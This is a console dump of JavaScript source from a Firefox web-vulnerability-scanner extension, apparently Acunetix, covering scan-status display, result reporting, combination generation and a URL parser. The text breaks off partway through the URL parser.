			var strFileName = "file://" + acunetixwebscanner.objFileHandler.getPath("AcunetixScanner", "Home") + acunetixwebscanner.objFileHandler.strPathSeparator + 'ScanResult.html';
			acunetixwebscanner.xulObjScannerOutputTab.linkedBrowser.contentWindow.open(strFileName, "_self");
			gBrowser.selectedTab = acunetixwebscanner.xulObjScannerOutputTab;
			
			/* this method (document.open) does not work in firefox 3, TODO: investigate why
			var objFileHandler = new ClassFileHandler();
			var objContent = objFileHandler.loadTextFile("AcunetixScanner\\temp.html", "Home");
			
			if(objContent.boolSuccess)
			{		
				acunetixwebscanner.xulObjScannerOutputTab = mainWindow.getBrowser().addTab("");
				acunetixwebscanner.xulObjScannerOutputTab.linkedBrowser.contentWindow.document.open();
				acunetixwebscanner.xulObjScannerOutputTab.linkedBrowser.contentWindow.document.write(objContent.strContent);
				acunetixwebscanner.xulObjScannerOutputTab.linkedBrowser.contentWindow.document.close();
				gBrowser.selectedTab = acunetixwebscanner.xulObjScannerOutputTab;
			}
			*/
		}
		
				
	}
	
	this.oneMoreRequestHandled = function()
	{
		this.intTotalRequestHandled ++;
		this.RenderScannerStatus();
	}
	
	this.oneMoreVulnerabilityFound = function(intTestIndex)
	{
		acunetixwebscanner.arrayOfTestProcedures[intTestIndex].intVulnerabilitiesCount ++;
		this.intVulnerableFoundNumber++;
		this.RenderScannerStatus();
	}
	
	this.oneMoreErrorFound = function()
	{
		this.intTotalRequestHandlingError ++;
		this.RenderScannerStatus();
	}
	
	this.RenderScannerStatus = function()
	{
		var strStatus			= "";
		var objProgress 		= document.getElementById('acunetix_scanning_progress');
		var objStatusElement	= document.getElementById("acunetix_scannerStatus");
		var objStatusElement2	= document.getElementById("acunetix_scannerStatus2");
		
		var objacunetix_tooltip_onScanning_1 = document.getElementById('acunetix_tooltip_onScanning_1');
		var objacunetix_tooltip_onScanning_2 = document.getElementById('acunetix_tooltip_onScanning_2');
		var objacunetix_tooltip_onScanning_3 = document.getElementById('acunetix_tooltip_onScanning_3');
		var objacunetix_tooltip_onScanning_4 = document.getElementById('acunetix_tooltip_onScanning_4');
		var objacunetix_tooltip_onScanning_5 = document.getElementById('acunetix_tooltip_onScanning_5');
		var objacunetix_tooltip_onScanning_6 = document.getElementById('acunetix_tooltip_onScanning_6');
		
		if(this.intVulnerableFoundNumber > 0)
		{
			if(objStatusElement2)
			{
				objStatusElement2.collapsed = false;
				if(this.intVulnerableFoundNumber == 1)
					objStatusElement2.value = "( "+ this.intVulnerableFoundNumber +" vulnerability found.)";
				else
					objStatusElement2.value = "( "+ this.intVulnerableFoundNumber +" vulnerabilities found.)";
			}
			
		
			for(var i = 0; i < acunetixwebscanner.arrayOfTestProcedures.length; i++)
			{
				if(acunetixwebscanner.arrayOfTestProcedures[i].intVulnerabilitiesCount > 0)
				{
					var objVulnLabel = document.getElementById("acunetix_tooltip_onVulnerableLabel_" + i);
					var objVulnValue = document.getElementById("acunetix_tooltip_onVulnerableValue_" + i);
					var objVulnLabelGroup = document.getElementById("acunetix_tooltip_onVulnerableLabel");
					var objVulnValueGroup = document.getElementById("acunetix_tooltip_onVulnerableValue");
					if(objVulnLabel == null)
					{
						objVulnLabel = document.createElementNS("http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul", "label");
						if(objVulnLabel)
						{
							objVulnLabel.setAttribute("id", "acunetix_tooltip_onVulnerableLabel_" + i);
							objVulnLabel.setAttribute("value", acunetixwebscanner.arrayOfTestProcedures[i].strType);
							if(objVulnLabelGroup)
								objVulnLabelGroup.appendChild(objVulnLabel);
						}
					}
					if(objVulnValue == null)
					{
						objVulnValue = document.createElementNS("http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul", "label");
						if(objVulnValue)
						{
							objVulnValue.setAttribute("id", "acunetix_tooltip_onVulnerableValue_" + i);
							if(objVulnValueGroup)
								objVulnValueGroup.appendChild(objVulnValue);
						}
					}
					if(objVulnValue)
						objVulnValue.value = acunetixwebscanner.arrayOfTestProcedures[i].intVulnerabilitiesCount + "";
				}
			}
		}
		else
		{
			if(objStatusElement2) objStatusElement2.collapsed = true;
		}
		
				
		if(this.boolScannerActive)
		{
			if(this.boolAbortScan)
				strStatus = strStatus + "Scanner status: Abort pending ";
			else
				strStatus = strStatus + "Scanner status: Testing ";
			
			if(objProgress != null) objProgress.collapsed = false;
			
			if(objacunetix_tooltip_onScanning_2)
			{
				objacunetix_tooltip_onScanning_2.collapsed = false;
				objacunetix_tooltip_onScanning_2.value = "Progress: " + Math.round(100 * this.intTestIndex / this.intMaxTestNumber) + "%";
			}
			if(objacunetix_tooltip_onScanning_3)
			{
				objacunetix_tooltip_onScanning_3.collapsed = false;
				//objacunetix_tooltip_onScanning_3.value = "Phase: " + this.intCurrentTestingPhase + "/" + this.intMaxTestingPhases + " - Task: " + this.intSubrequestIndex + "/" + this.intSubrequestMaxNumber;
				var strTmp = "";
				strTmp = strTmp + "Task: " + this.intTestIndex + "/" + this.intMaxTestNumber;
				strTmp = strTmp + " (Group: " + this.intGroupIndex + "/" + this.intMaxGroupNumber;
				strTmp = strTmp + ", Test: " + this.intTestProcedureIndex + "/" + this.intMaxTestProcedureNumber + ")";
				objacunetix_tooltip_onScanning_3.value = strTmp;
			}
			if(objacunetix_tooltip_onScanning_4)
			{
				objacunetix_tooltip_onScanning_4.collapsed = false;
				objacunetix_tooltip_onScanning_4.value = "HTTP Requests: " + this.intTotalRequestHandled;
			}
			if(objacunetix_tooltip_onScanning_5)
			{
				objacunetix_tooltip_onScanning_5.collapsed = false;
				objacunetix_tooltip_onScanning_5.value = "Vulnerabilities: " + this.intVulnerableFoundNumber;
			}
			if(objacunetix_tooltip_onScanning_6)
			{
				objacunetix_tooltip_onScanning_6.collapsed = false;
				objacunetix_tooltip_onScanning_6.value = "Errors: " + this.intTotalRequestHandlingError;
			}
			
			if(objProgress != null)
			{
				objProgress.collapsed = false;
				//objProgress.value 	= Math.round(100 * curentProgress / maxProgress) + "";
				objProgress.value = Math.round(100 * this.intTestIndex / this.intMaxTestNumber) + "";
			}
		}
		else
		{
			if(this.boolAbortScan)
				strStatus = strStatus + "Scanner status: Aborted. ";
			else
				strStatus = strStatus + "Scanner status: Finished. ";
				
			if(objProgress != null) objProgress.collapsed = true;
			
			if(objacunetix_tooltip_onScanning_2) objacunetix_tooltip_onScanning_2.collapsed = true;
			if(objacunetix_tooltip_onScanning_3) objacunetix_tooltip_onScanning_3.collapsed = true;
			if(objacunetix_tooltip_onScanning_4) objacunetix_tooltip_onScanning_4.collapsed = true;
			if(objacunetix_tooltip_onScanning_5) objacunetix_tooltip_onScanning_5.collapsed = true;
			if(objacunetix_tooltip_onScanning_6) objacunetix_tooltip_onScanning_6.collapsed = true;
		}
		
		if(objacunetix_tooltip_onScanning_1)
			objacunetix_tooltip_onScanning_1.value = strStatus;
			
	    if(objStatusElement != null)	objStatusElement.value = strStatus;
	}
	
	this.abortScan = function()
	{
		if( ! confirm (acunetixwebscanner.strings.getString("confirm.AbortScanning")) )
			return;
		logToFile("classScanningProcessStatus/abortScan");
		this.boolAbortScan = true;
		this.RenderScannerStatus();
		
		for(var i = 0; i < this.arrayObjAsincronTester.length; i++) // set the abort flag for each tester
			this.arrayObjAsincronTester[i].boolTesterMarkedToDie = true;
			
		setTimeout('acunetixwebscanner.objScanningProcessStatus.stopScanningProcess()',1000);
	}
	
	this.buildRequestTestOutput = function(objRequest,arrayTestResults)
	{
		
		//save the acunetix scanner connector file
		var objEncoder = new encoderClass();
		for(var i = 0; i < arrayTestResults.length; i++)
		{
			var strVulnerability = "\t\t<Vulnerability>\r\n"
						
			strVulnerability = strVulnerability + "\t\t\t<url>" + objEncoder.encode64(objRequest.objAction.getURL()) + "</url>\r\n";
			strVulnerability = strVulnerability + "\t\t\t<name>" + objEncoder.encode64(arrayTestResults[i].vul_name) + "</name>\r\n";
			
			strVulnerability = strVulnerability + "\t\t\t<paramName>" + objEncoder.encode64(objRequest.arrayParameters[arrayTestResults[i].intItemIndex].strName) + "</paramName>\r\n";
			strVulnerability = strVulnerability + "\t\t\t<paramValue>" + objEncoder.encode64(arrayTestResults[i].strInjectedValue) + "</paramValue>\r\n";
			strVulnerability = strVulnerability + "\t\t\t<paramType>" + objEncoder.encode64(objRequest.arrayParameters[arrayTestResults[i].intItemIndex].strRequestType) + "</paramType>\r\n";			
			
			strVulnerability = strVulnerability + "\t\t\t<request>" + objEncoder.encode64(arrayTestResults[i].strRequestHeader) + "</request>\r\n";
			strVulnerability = strVulnerability + "\t\t\t<response>" + objEncoder.encode64(arrayTestResults[i].strResponseHeader) + "</response>\r\n";
			
			strVulnerability = strVulnerability + "\t\t\t<fullresponse>" + objEncoder.encode64(arrayTestResults[i].strResponseHeader + "\r\n\r\n" + arrayTestResults[i].strReponseHTML) + "</fullresponse>\r\n";
			strVulnerability = strVulnerability + "\t\t\t<vulnid>" + objEncoder.encode64(arrayTestResults[i].wvsCorelationID) + "</vulnid>\r\n";
			
			strVulnerability = strVulnerability + "\t\t</Vulnerability>\r\n";
		
			acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\wvs.xml",strVulnerability, true, "Home");
			
			strVulnerability = "";
		}
		
		
		var strRequestModel	= acunetixwebscanner.objFileHandler.loadTextFromLocalURI("chrome://acunetixwebscanner/content/request.style").strContent;
		var strParamModel	= acunetixwebscanner.objFileHandler.loadTextFromLocalURI("chrome://acunetixwebscanner/content/parameter.style").strContent;
		
		var source = objRequest.strRequestOrigin;
		if(objRequest.strName != "" )
			source = source + " (" + objRequest.strName + ")"
		
		strRequestModel = strRequestModel.supplant
			({
				request_url     : objRequest.objAction.getURL(),
				request_source  : source,
				request_method  : objRequest.strRequestMethod
			});
		
		if(arrayTestResults.length == 0)
		{
			strRequestModel = strRequestModel.supplant
				({
					show_params_table_header    : "display:none",
					show_no_vuln_message        : "",
					parameter_list              : ""
				});
		}
		else
		{
			var strParam = new String();
			for(var i = 0; i < arrayTestResults.length; i++)
			{
			  
				strParam = strParam + strParamModel.supplant
					({
						param_name          : objRequest.arrayParameters[arrayTestResults[i].intItemIndex].strName,
						param_method        : objRequest.arrayParameters[arrayTestResults[i].intItemIndex].strRequestType,
						vul_name            : arrayTestResults[i].vul_name,
						vul_test_name       : arrayTestResults[i].vul_test_name,
						vuln_severity       : arrayTestResults[i].vuln_severity,
						vuln_description    : arrayTestResults[i].vuln_description,
						request_header      : escapeHTML(arrayTestResults[i].strRequestHeader),
						response_header     : escapeHTML(arrayTestResults[i].strResponseHeader),
						param_index         : arrayTestResults[i].intItemIndex,
						show_response_html  : (arrayTestResults[i].strReponseText == "") ? "display:none" : "",
						response_html       : escapeHTML(arrayTestResults[i].strReponseHTML),
						request_index       : this.intGroupIndex
					});
				this.intGroupIndex ++;
			}
			
			strRequestModel = strRequestModel.supplant
				({
					show_params_table_header    : "",
					show_no_vuln_message        : "display:none",
					parameter_list              : strParam
				});
		}
		   
		this.strTestResultHTMLOutput = this.strTestResultHTMLOutput + strRequestModel;
	}
}

function classAsincronTester(objRequest)
{
	this.objNextAsincronTester	= null;
	this.objRequest				= objRequest
	this.intTestIndex			= 0;
	this.intCombinationIndex 	= 0;
	
	this.boolTesterMarkedToDie	= false;
	this.arrayTestResults 		= new Array();
	
	
	this.objTaskResult			=
		{
			boolIsVulenrable	: false,
			// the last http request descriptor
			intReponseStatus	: 0,
			strResponseText		: "",
			strResponseHeader	: "",
			strRequestHeader	: "",
			strRequestURL		: "",
			//
			strInjectedValue	: "",
			// the last xmlhtprequest status
			strErrorText		: "",
			intErrorCode		: -1
		};

	this.fncTaskCallBack =
	{
		notify: function(timer)
		{
			if(this.parent.boolTesterMarkedToDie) // if tester aborted and somehow not died yet kill it here
				return;

			if(this.parent.objTaskResult.boolIsVulenrable)
			{
				acunetixwebscanner.objScanningProcessStatus.oneMoreVulnerabilityFound(this.parent.intTestIndex);
				
				//log the success data
				this.parent.arrayTestResults.push
				({
					vul_name			: acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].strType,
					vuln_severity		: acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].severity,
					vuln_description	: acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].strDescription,
					vul_test_name		: acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].strTestName,
					wvsCorelationID		: acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].wvsCorelationID,
					
					intItemIndex		: this.parent.objRequest.arrayOfGeneratedTestCombinations[this.parent.intCombinationIndex].intTestedParameterIndex,
					intTestIndex		: this.parent.intTestIndex,
					
					strInjectedValue	: this.parent.objTaskResult.strInjectedValue,
					strRequestHeader	: this.parent.objTaskResult.strRequestHeader,
					strResponseHeader	: this.parent.objTaskResult.strResponseHeader,
					strReponseHTML		: this.parent.objTaskResult.strResponseText				
					
				});
				
				//optimization, we reduce all combinations where current tested parameter is tested
				if(acunetixwebscanner.objMozPrefs.getBoolPref("boolEnableTestCombinationReductionOptimisation"))
				{
					var intPreviousCombinationNumber = this.parent.objRequest.arrayOfGeneratedTestCombinations.length;
					var intCurrentCombinationNumber = this.parent.objRequest.reduceArrayTestList(this.parent.intCombinationIndex + 1, this.parent.objRequest.arrayOfGeneratedTestCombinations[this.parent.intCombinationIndex].intTestedParameterIndex);
					
					if(intPreviousCombinationNumber > intCurrentCombinationNumber)
					{
						acunetixwebscanner.objScanningProcessStatus.intMaxTestNumber = acunetixwebscanner.objScanningProcessStatus.intMaxTestNumber - (intPreviousCombinationNumber - intCurrentCombinationNumber);
					}
				}
			}
			//go to the next combination
			acunetixwebscanner.objScanningProcessStatus.intTestIndex ++;
			this.parent.intCombinationIndex ++;
			
			acunetixwebscanner.objScanningProcessStatus.RenderScannerStatus();
			
			if(this.parent.intCombinationIndex < this.parent.objRequest.arrayOfGeneratedTestCombinations.length)
			{
				acunetixwebscanner.arrayOfTestProcedures[this.parent.intTestIndex].doTest(this.parent);
				return;
			}
			//if we are here then we are done with this test so we can go to the next test type
			this.parent.doNextTest();
		}
	}
	this.fncTaskCallBack.parent = this;
	
	this.doNextTest = function()
	{
		if(this.boolTesterMarkedToDie) // if tester aborted and somehow not died yet kill it here
			return;
		
		this.intTestIndex ++;
		while(this.intTestIndex < acunetixwebscanner.arrayOfTestProcedures.length)
		{
			if (acunetixwebscanner.isTestAllowed(this.intTestIndex))
			{
				logToFile("classAsincronTester/doNextTest test alowed");
				break;
			}
			else
			{
				logToFile("classAsincronTester/doNextTest => Test not alowed, go to new test");
				this.intTestIndex ++;
			}
		}
		
		//logToFile("classAsincronTester/doNextTest => intTestIndex: " + this.intTestIndex + ", arrayOfTestProcedures.length: " + acunetixwebscanner.arrayOfTestProcedures.length);
		
		if (this.intTestIndex < acunetixwebscanner.arrayOfTestProcedures.length )
		{
			//generating combinations
			this.objRequest.generateParameterMannipulationCombinations();
			
			// if we have at least one test
			if(this.objRequest.arrayOfGeneratedTestCombinations.length > 0)
			{
				this.intCombinationIndex = 0;
				acunetixwebscanner.objScanningProcessStatus.intTestProcedureIndex ++;
				acunetixwebscanner.arrayOfTestProcedures[this.intTestIndex].doTest(this);
				return;
			}
		}
		
		if(this.objNextAsincronTester != null)
		{
			this.objNextAsincronTester.doTest();    
		}
		else
		{
			logToFile("classAsincronTester/callback doNextTest => Last test, scan finished");
			acunetixwebscanner.objScanningProcessStatus.stopScanningProcess();
		}
	}
	
	this.doNextTest.parent = this;
	

	this.doTest = function()
	{
		logToFile("classAsincronTester => START");
		
		acunetixwebscanner.objScanningProcessStatus.intGroupIndex ++;
		acunetixwebscanner.objScanningProcessStatus.intTestProcedureIndex = 0;
		
		this.intTestIndex = -1;
		this.doNextTest();
	}
}
VM894:7 /*
Author:		Attila Gerendi
Purpose:	some general functions
*/

function log(text)
{
	dump("Scanner: "+text+"\r\n");
}

function getElementIDOrGenerateOne(objElement)
{
	function IDAlreadyExist(strId)
	{
		
		var objPageDocument = window.top.getBrowser().browsers[window.top.getBrowser().mTabBox.selectedIndex].contentWindow.document;
		if (objPageDocument.getElementById(strId) != null)
			return(true);
		
		var frames = objPageDocument.getElementsByTagName("frame");
		for (var i = 0; i < frames.length; i++) 
			if (frames[i].contentDocument.getElementById(strId) != null)
				return(true);
			
		var frames = objPageDocument.getElementsByTagName("iframe");
		for (var i = 0; i < frames.length; i++) 
			if (frames[i].contentDocument.getElementById(strId) != null)
				return(true);
		
		return(false);
	}
	
	var strId = "";
	if(objElement != null)
		strId = objElement.id;
	if (strId == "")
	{
		while(1)
		{
			strId = "gen_" + Math.floor(Math.random()*1345670);
			if( ! IDAlreadyExist(strId) )
				break;
		}
	}
	if(objElement != null)
		objElement.id = strId;	
	return(strId);
}

function LogHTTPToFile(objResponse, boolIsVulnerable)
{
	var strText = "";
	var objDate = new Date();
	var timeDate = objDate.getHours() + ":" + objDate.getMinutes() + ":" + objDate.getSeconds() + "." + objDate.getMilliseconds();
	strText = strText + "\r\n=================[" + objResponse.strRequestURL + "][" + timeDate + "]\r\n"
		
	strText = strText + objResponse.strRequestHeader;
	strText = strText + "-----------------[";
	if(objResponse.intErrorCode == -1) strText = strText + "ERROR" ;
	if(objResponse.intErrorCode == 0 ) strText = strText + "OK (header+content)" ;
	if(objResponse.intErrorCode == 1 ) strText = strText + "Aborted by user" ;
	if(objResponse.intErrorCode == 2 ) strText = strText + "Aborted by timeout" ;
	if(objResponse.intErrorCode == 3 ) strText = strText + "ERROR" ;
	if(objResponse.intErrorCode == 4 ) strText = strText + "Aborted by length (header)" ;
	if(objResponse.intErrorCode == 5 ) strText = strText + "Aborted by content (header)" ;

	strText = strText + "]\r\n";
		
	if((objResponse.intErrorCode == 0)||(objResponse.intErrorCode == 4) || (objResponse.intErrorCode == 5))
		strText	= strText + objResponse.strResponseHeader + "\r\n";
			
	if(	acunetixwebscanner.objMozPrefs.getBoolPref("boolIncludeHTTPLogInFunctionalLog") && acunetixwebscanner.objMozPrefs.getBoolPref("boolHTTPLogInFunctionalLogOnlyHeaders"))
		logToFile(strText);
	
	if(objResponse.intErrorCode == 0)
		strText	= strText + objResponse.strResponseText + "\r\n";

	if(acunetixwebscanner.objMozPrefs.getBoolPref("boolIncludeHTTPLogInFunctionalLog") && (!acunetixwebscanner.objMozPrefs.getBoolPref("boolHTTPLogInFunctionalLogOnlyHeaders"))) 
		logToFile(strText);
		
	if( acunetixwebscanner.objMozPrefs.getBoolPref("boolLimitHTTPLogingToVulnerablerequest") && (!boolIsVulnerable) )
		return;
	
	if( acunetixwebscanner.objMozPrefs.getBoolPref("boolEnableHTTPLoging"))
		acunetixwebscanner.objFileHandler.saveTextFile(acunetixwebscanner.objMozPrefs.getCharPref("strHTTPLoginFileName"), strText, true);
}

function logToFile(strText, intDebuglevel)
{
	if(intDebuglevel == null) intDebuglevel = 0;
	var objMozPrefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService).getBranch("extensions.acunetixwebscanner.");
	if(intDebuglevel >  objMozPrefs.getIntPref("intDebuggLevel")) return;
	if(objMozPrefs.getBoolPref ("boolEnableFunctionalLogging"))
	{
		var objDate = new Date();
		var timeDate = objDate.getHours() + ":" + objDate.getMinutes() + ":" + objDate.getSeconds() + "." + objDate.getMilliseconds();
		if (strText!= "") strText = timeDate + " :\t" + strText +"\r\n";
		acunetixwebscanner.objFileHandler.saveTextFile(objMozPrefs.getCharPref("strFunctionalLoggingFileName"), strText, true);
	}
}

function dumpObject(obj, strName, strIndent, intDepth, intMaxDepth, boolSkipFunctions)
{
	if(intDepth == null) intDepth = 0;
	if(intMaxDepth == null) intMaxDepth = 10;
	if(strIndent == null) strIndent = "";
	if(strName == null) strName = "object";
	if(boolSkipFunctions == null) boolSkipFunctions = true;
	
	var strRetval = strIndent + strName + ":";	

	if(intDepth > intMaxDepth)
		return(strRetval + "<Maximum Depth Reached>\r\n");
	
	if (typeof obj == "function")
	{
		if(boolSkipFunctions)
			return("");
		return(strRetval + "<Function>\r\n")
	}
	if (typeof obj == "object")
	{
		strIndent = strIndent + "\t";
		var child = 0;
		for (var item in obj)
        {
			try
			{
			   child = obj[item];
			} catch (e)
			{
			   return(strRetval + "<Unable to Evaluate>\r\n");
			}
			strRetval = strRetval + "\r\n" + dumpObject(child, item, strIndent, intDepth + 1, intMaxDepth, boolSkipFunctions);
		}
		return(strRetval);
	}
	return(strRetval + obj + "\r\n");
}


function browseForFileToSave(aTitle)
{
	const nsIFilePicker = Components.interfaces.nsIFilePicker;
	var FP = Components.classes['@mozilla.org/filepicker;1'].createInstance(nsIFilePicker);
	FP.init(window, aTitle, FP.modeSave);
	FP.appendFilters(0x01);
	FP.appendFilters(0x04);
	var rv =  FP.show();
	if (rv == nsIFilePicker.returnOK || rv == nsIFilePicker.returnReplace) 
		return(FP.file);
    return(null);
}

function escapeHTML (strText)
{
    strText = strText.replace(/&/g, "&amp;").replace(/</g,"&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&#39;");
    return (strText);
}

function formatDateForWVSExport(objDate)
{
	var strYear = objDate.getFullYear() + "";
	var strMonth = objDate.getMonth() + "";
	if (strMonth.length == 1) strMonth = "0" + strMonth;
	var strDay = objDate.getDate() + "";
	if (strDay.length == 1) strDay = "0" + strDay;
	var strHour = objDate.getHours() + "";
	if (strHour.length == 1) strHour = "0" + strHour;
	var strMinute = objDate.getMinutes() + "";
	if (strMinute.length == 1) strMinute = "0" + strMinute;
	var strSeccond = objDate.getSeconds() + "";
	if (strSeccond.length == 1) strSeccond = "0" + strSeccond;
	
	return(strYear + strMonth + strDay + strHour + strMinute + strSeccond)
}


function addXULElementsChildsFromString(xulObjParent,strContent)
{
	var parser = new DOMParser();
	var xulString="<box xmlns='http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul'>"+strContent+"</box>";
	var doc = parser.parseFromString(xulString, "text/xml");
	
	var roottag = doc.documentElement;
	if ((roottag.tagName == "parserError") || (roottag.namespaceURI == "http://www.mozilla.org/newlayout/xml/parsererror.xml"))
	{
		log("convertStringToXulElement: ERROR parsing string");
		return(false);
	}
	var height = xulObjParent.height;
	for(var i=0; i<roottag.childNodes.length ; i++)
		xulObjParent.appendChild(roottag.childNodes[i]);
	xulObjParent.height = height;
    return(true);
}
VM894:8 /*
Author: 	Attila Gerendi
Purpose:	The combinator generator
*/

function generateCombinationFromCombinationReferenceList(arrayReference)
{
	this.arrayCombinations  		= new Array();
    this.arrayReference     		= new Array();
	this.arrayIncrement     		= new Array();  
    this.incrementArray             = incrementArray;
    this.generateCombinationArray   = generateCombinationArray;
				
    function incrementArray(intPos)
    {
        intPos = (intPos == null) ? (this.arrayIncrement.length - 1) : intPos;
        this.arrayIncrement[intPos] ++ ;
        if( this.arrayIncrement[intPos] > this.arrayReference[intPos].intMaxVal )
        {
            this.arrayIncrement[intPos] = this.arrayReference[intPos].intMinVal ;
            if(intPos == 0) return(false);
            return(this.incrementArray(intPos - 1));
        }
        return(true);
    }
    
    function generateCombinationArray()
    {
        this.arrayCombinations  = new Array();
        if(this.arrayReference == null)
            return;
        this.arrayIncrement = new Array();
		
        for(var i=0 ; i<this.arrayReference.length; i++) this.arrayIncrement.push(this.arrayReference[i].intMinVal);
        do
        {
            this.arrayCombinations.push(this.arrayIncrement.slice());
        }
        while(this.incrementArray())
    }
	
	if(arrayReference)
	{
		this.arrayReference = arrayReference;
		this.generateCombinationArray();
	}
	return(this.arrayCombinations);
}

function classCombinationGenerator(arrayReference)
{
    this.arrayReference     = new Array();	
    this.arrayIncrement     = new Array();
    this.arrayCombinations  = new Array();
                
    this.incrementArray             = incrementArray;
    this.generateCombinationArray   = generateCombinationArray;
    
    this.generateCombinationArray(arrayReference);
    
    function incrementArray(intPos)
    {
        intPos = (intPos == null) ? (this.arrayIncrement.length-1) : intPos;
        this.arrayIncrement[intPos] ++ ;
        if( this.arrayIncrement[intPos] > this.arrayReference[intPos] )
        {
            this.arrayIncrement[intPos] = 1 ;
            if(intPos == 0) return(false);
            return(this.incrementArray(intPos - 1));
        }
        return(true);
    }
    
    function generateCombinationArray(arrayReference)
    {
        this.arrayReference     = arrayReference;
        this.arrayCombinations  = new Array();
        
        var totalCombinations = 0;
        
        if(this.arrayReference==null)
            return(totalCombinations);
        
        this.arrayIncrement = new Array();
        for(var i=0 ; i<this.arrayReference.length; i++) this.arrayIncrement.push(1);
        do
        {
            this.arrayCombinations.push(this.arrayIncrement.slice());
            totalCombinations ++;
        }
        while(this.incrementArray())
        
        return(totalCombinations);
    }				
}

function classMultipleSelectionCombinationGenerator()
{
    this.getAllPossibbleCombinationsNumber 	= getAllPossibbleCombinationsNumber;
	this.getCombinations 					= getCombinations;
	this.getCombinationByIndex				= getCombinationByIndex;
    
    function factorial(intValue)
    {
        var result = 1;
        for (var i = 2; i <= intValue; i++)
            result *= i
        return result;
    }

    function combinationsNumber(intN,intK)
    {
        return (  factorial(intN)/(factorial(intK)*factorial(intN-intK)) )
    }
    
    this.combinationArray = new Array();
   
    function getCombinations(intN,intK)
    {
        arrayComb = new Array();
        v = new Array();
        combinations (arrayComb, v, 1, intN, 1, intK);
        return(arrayComb);
    }
    
    function combinations(arrayComb, v, start, n, k, maxk)
    {
        var i = 0;
        if (k > maxk)
        {
            var comb = new Array();
            arrayComb.push(v.slice());   
			return;         
        }
        for (i = start; i <= n; i++)
        {
                v[k-1] = i;
                combinations (arrayComb, v, i+1, n, k+1, maxk);
        }
    }
    
    function getCombinationByIndex(intN, intCombinationNumber)
    {
		arrayReturn = new Array();
		
		var intCombNumber = 0;
		var intCombNumberTmp = 0;
		var i;
		var intK = -1;
		
		for(i = 1; i <= intN; i++)
		{
			intCombNumberTmp = intCombNumber;
			intCombNumber = intCombNumber + combinationsNumber(intN,i);	
			if(intCombNumber >= intCombinationNumber)
			{
				intK = i;	
				intCombNumber = intCombinationNumber - intCombNumberTmp -1;
				break;
			}
		}			
			
		if((intK > 0) && (intK <= intN))
		{
			arrayReturn = getCombinations(intN,intK)[intCombNumber]; 	
		}
		
		return(arrayReturn);
    }
    

    function getAllPossibbleCombinationsNumber(intFieldNumber)
    {
        var result = 0;
        for(var i = 1 ; i <= intFieldNumber; i++)
            result = result + combinationsNumber(intFieldNumber,i);
        return result;
    }
}
VM894:9 /*
Author:		Attila Gerendi
Purpose:	The classUrlParser
*/

function classUrlParser(strURL)
{
	this.boolIsRElative = false;
	this.strScheme		= new String();
	this.strHost		= new String();
	this.strPort		= new String();
	this.strUsername	= new String();
	this.strPassword	= new String();
	this.strFileName	= new String();
	this.strDirectory	= new String();
	this.strQuery		= new String();
	this.strParam		= new String();
	this.strRef			= new String();
	
	this.ParseUrl				= ParseUrl;
	this.toString				= toString;
	this.colerateWithStringURL	= colerateWithStringURL;
	this.getURL 				= getURL;
	this.compareWith			= compareWith;
	
	this.ParseUrl(strURL);
	
	function compareWith(objUrl)
	{
		logToFile("classUrlParser/compareWith (" + this.getURL() + ", " + objUrl.getURL() + ")");
		
		var intRetval = 0;
		
		//check for subdomains
		var arrayThis = this.strHost.toLowerCase().split(/\./);
		var arrayObj = objUrl.strHost.toLowerCase().split(/\./);
		
		if ((arrayThis.length <= 2) && (arrayObj.length <= 2) && (arrayThis.length != arrayObj.length))
			return(intRetval);
		
		if ((arrayThis.length > 0) && (arrayThis[arrayThis.length - 1] != arrayObj[arrayObj.length - 1]))
			return(intRetval);
		
		if((arrayThis.length > 1) && (arrayThis[arrayThis.length - 2] != arrayObj[arrayObj.length - 2]))
			return(intRetval);
			
		//Todo : there is a third possibility too => not to big problem but there may be a warning generated
		
		intRetval ++;
		
		if(this.strHost.toLowerCase() != objUrl.strHost.toLowerCase())
		{
			//similitudes 127.0.0.1, localhost
			if(
			   !(
				((this.strHost.toLowerCase() == "127.0.0.1") || (this.strHost.toLowerCase() == "localhost")) &&
				((objUrl.strHost.toLowerCase() == "127.0.0.1") || (objUrl.strHost.toLowerCase() == "localhost"))
			   )
			  )
			logToFile("classUrlParser/compareWith  different strHost");
			return(intRetval);
		}
		
		intRetval ++;
		
		if(this.strDirectory.toLowerCase() != objUrl.strDirectory.toLowerCase().substring(0,this.strDirectory.length))
		{
			logToFile("classUrlParser/compareWith  this.strDirectory included in obj.subdirectory at start");
			return(intRetval);
		}
		
		intRetval ++;
		
		if(this.strDirectory.toLowerCase() != objUrl.strDirectory.toLowerCase())
		{
			logToFile("classUrlParser/compareWith  different strDirectory");
			return(intRetval);
		}
		
		intRetval ++;
		
		if(this.strFileName.toLowerCase() != objUrl.strFileName.toLowerCase())
		{
			logToFile("classUrlParser/compareWith  different strFileName");
			//TODO: similitudes can exist strFileName = "" , index.php, or any index file...
			return(intRetval);
		}
		
		intRetval ++;
		
		logToFile("classUrlParser/compareWith  equal");
		return(intRetval);
	}
	
	function getURL(boolIncludeUserAutent)
	{
		boolIncludeUserAutent = (boolIncludeUserAutent == null) ? false : boolIncludeUserAutent;
		
		var strUrl = new String;
		
		strUrl = strUrl + this.strScheme + '://';
		
		if(
		   (boolIncludeUserAutent) &&
		   (this.strUsername != "") &&
		   (this.strPassword != "")
		   ) strUrl = strUrl + this.strUsername + ':' + this.strPassword + '@';
		
		strUrl = strUrl + this.strHost;
		strUrl = strUrl + this.strDirectory;
		strUrl = strUrl + this.strFileName;
			
		return(strUrl);
	}
	
	function toString()
	{
		var retval = "";
		for (var property in this)
		{
			if (typeof(this[property]) == "function") continue;
			retval = retval + property + " = " + this[property] + "\r\n";
		}
		return(retval);
	}
	
	function colerateWithStringURL (strUrl)
	{
		if(strUrl == "")
				return;
		var url = new classUrlParser(strUrl);
		var strSpec = "";
		var nsiurl 	= Components.classes["@mozilla.org/network/standard-url;1"]
						.createInstance(Components.interfaces.nsIStandardURL)
